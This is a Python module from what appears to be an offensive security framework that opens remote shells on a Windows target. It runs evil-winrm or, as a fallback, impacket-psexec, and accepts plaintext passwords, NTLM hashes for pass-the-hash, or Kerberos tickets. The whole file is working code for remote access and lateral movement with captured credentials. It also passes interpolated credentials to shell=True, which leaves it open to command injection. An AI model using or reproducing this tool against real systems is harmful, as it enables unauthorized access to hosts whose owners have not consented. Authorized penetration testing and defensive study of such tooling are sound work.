# modules/shell.py

import subprocess
import shutil
import signal
from core.colors import red, green, yellow, blue

def try_shell(cmd, name):
    print(blue(f"[*] Trying {name} shell..."))
    try:
        subprocess.run(cmd, shell=True)
        return True
    except KeyboardInterrupt:
        print(red(f"\n[!] {name} shell interrupted. Returning to prompt..."))
        return False
    except Exception as e:
        print(red(f"[!] {name} failed to run: {e}"))
        return False

def run_shell(session):
    print(blue(f"[*] Launching shell against {session.target_ip}..."))

    def handler(sig, frame):
        print(red("\n[!] Shell interrupted by user. Returning to prompt."))
        raise KeyboardInterrupt

    signal.signal(signal.SIGINT, handler)

    # === Check for evil-winrm ===
    if not shutil.which("evil-winrm"):
        print(yellow("[!] evil-winrm not found in PATH. Skipping to PsExec..."))
    else:
        if session.hash:
            winrm_cmd = (
                f"evil-winrm -i {session.target_ip} -u {session.username} -H {session.hash}"
            )
        elif session.password:
            winrm_cmd = (
                f"evil-winrm -i {session.target_ip} -u {session.username} -p '{session.password}'"
            )
        else:
            winrm_cmd = (
                f"evil-winrm -i {session.target_ip} -u {session.username} -k --no-pass"
            )

        if try_shell(winrm_cmd, "Evil-WinRM"):
            print(green("[+] Evil-WinRM shell executed successfully."))
            return
        else:
            print(yellow("[!] Evil-WinRM failed. Trying PsExec..."))

    # === PsExec fallback ===
    if not shutil.which("impacket-psexec") and not shutil.which("psexec"):
        print(red("[-] PsExec not found in PATH. Cannot proceed."))
        return

    if session.hash:
        psexec_cmd = (
            f"impacket-psexec {session.domain}/{session.username}@{session.target_ip} "
            f"-hashes :{session.hash}"
        )
    elif session.password:
        psexec_cmd = (
            f"impacket-psexec {session.domain}/{session.username}:{session.password}@{session.target_ip}"
        )
    else:
        psexec_cmd = (
            f"impacket-psexec {session.domain}/{session.username}@{session.target_ip} -k --no-pass"
        )

    if try_shell(psexec_cmd, "PsExec"):
        print(green("[+] PsExec shell executed successfully."))
    else:
        print(red("[-] Both Evil-WinRM and PsExec shell attempts failed."))
